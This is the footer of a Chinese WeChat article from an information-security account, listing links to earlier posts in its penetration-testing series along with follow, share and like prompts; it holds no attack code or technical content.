▶[【渗透实战系列】|6- BC 杀猪盘渗透一条龙 (文末附【渗透实战系列】其他文章链接)](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485861&idx=1&sn=39318b76da490ed2a8746134f685d454&chksm=ce67a33cf9102a2aa3793cafbd701c77f851ca9dac3f827524b5cfe093cbecb14892ee131400&scene=21#wechat_redirect)

▶[【渗透实战系列】|5 - 记一次内衣网站渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485826&idx=2&sn=8f11b7cc12f6c5dfb5eeeb316f14f460&chksm=ce67a31bf9102a0d704877584dc3c49141a376cc1b35c0659f3ae72baa7e77e6de7e0f916db5&scene=21#wechat_redirect)

▶[【渗透实战系列】|4 - 看我如何拿下 BC 站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485789&idx=2&sn=a1a3c9fc97eeab0b5e5bd3d311e3fae6&chksm=ce67a3c4f9102ad21ce5c895d364b4d094391d2369edfc3afce63ed0b155f8db1c86fa6924f1&scene=21#wechat_redirect)  

▶[【渗透实战系列】|3 - 一次简单的渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485778&idx=2&sn=997ecdc137f7ae88737e827b29db4e45&chksm=ce67a3cbf9102add52833faf5ad7346affc93589fc8babf72468997c2dbd88c25e8f06d8a7e0&scene=21#wechat_redirect)

▶[【渗透实战系列】|2 - 记一次后门爆破到提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485647&idx=2&sn=28a227ff21a6a99e323f6e27130a5ad5&chksm=ce67a256f9102b4030db2fc636ff1d454d46178fc2003368305cdc06ae2a4c81dd011dfcb361&scene=21#wechat_redirect)

▶[【渗透实战系列】|1 一次对跨境赌博类 APP 的渗透实战（getshell 并获得全部数据）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485589&idx=1&sn=f4f64ea923675c425f1de9e4e287fb07&chksm=ce67a20cf9102b1a1a171041745bd7c243156eaee575b444acc62d325e2cd2d9f72b2779cf01&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONSgp1TKd5oeaGb76g5eMFibnANHNp30ic7NtpVnU12TNkBynw2ju7RDHbYtVZibm5rjDh7VKbAEyO8ZQ/640?wx_fmt=jpeg)  

**长按 - 识别 - 关注**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONRHbDcqVCY8LR0Y5uDpRzUdh4kN8gRTPLYhNib2rHTJFT9cJ77DRe7tbyjP3mfuRk0P8PKPqdWUbkw/640?wx_fmt=jpeg)

**Hacking 黑白红**

一个专注信息安全技术的学习平台

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBDEU5hJAFfap4mBBAnI4BIic2GAuYgDwUzqwIb9wicGiaCyopAyJEKapgA/640?wx_fmt=gif)

**点分享**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBRJ4tRlk9QKMxMAMticVia5ia8bcewCtM3W67zSrFPyjHuSKmeESESE1Ig/640?wx_fmt=gif)

**点收藏**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBnTO2pb7hEqNd7bAykePEibP0Xw7mJTJ7JnFkHuQR9vHE7tNJyHIibodA/640?wx_fmt=gif)

**点点赞**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBhibuWXia5pNqBfUReATI6GO6sYibzMvj8ibQM6rOo2ULshCrbaM0mJYEqw/640?wx_fmt=gif)

**点在看**